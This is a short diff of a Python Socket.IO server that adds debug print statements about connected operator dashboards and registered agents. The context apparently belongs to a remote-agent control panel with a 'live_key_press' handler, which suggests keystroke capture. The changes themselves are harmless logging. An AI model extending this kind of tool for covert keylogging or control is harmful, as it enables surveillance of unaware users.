@@ -2793,8 +2793,10 @@ def handle_disconnect():
 def handle_operator_connect():
     """When a web dashboard connects."""
     join_room('operators')
+    print(f"Operator dashboard connected. Sending {len(AGENTS_DATA)} agents to new operator.")
+    print(f"Current agents: {list(AGENTS_DATA.keys())}")
     emit('agent_list_update', AGENTS_DATA) # Send current agent list to the new operator
-    print("Operator dashboard connected.")
+    print("Agent list sent to operator.")
 
 def _emit_agent_config(agent_id: str):
     return
@@ -2930,6 +2932,10 @@ def handle_agent_register(data):
         'uptime': 0
     }
     
+    print(f"Agent registered: {agent_id} ({platform})")
+    print(f"Current agents: {list(AGENTS_DATA.keys())}")
+    print(f"Emitting agent_list_update to operators room with {len(AGENTS_DATA)} agents")
+    
     # Notify operators
     emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
     
@@ -2940,7 +2946,7 @@ def handle_agent_register(data):
         'message': 'Agent registered successfully'
     })
     
-    print(f"Agent registered: {agent_id} ({platform})")
+    print(f"Agent registration complete for {agent_id}")
 
 @socketio.on('live_key_press')
 def handle_live_key_press(data):
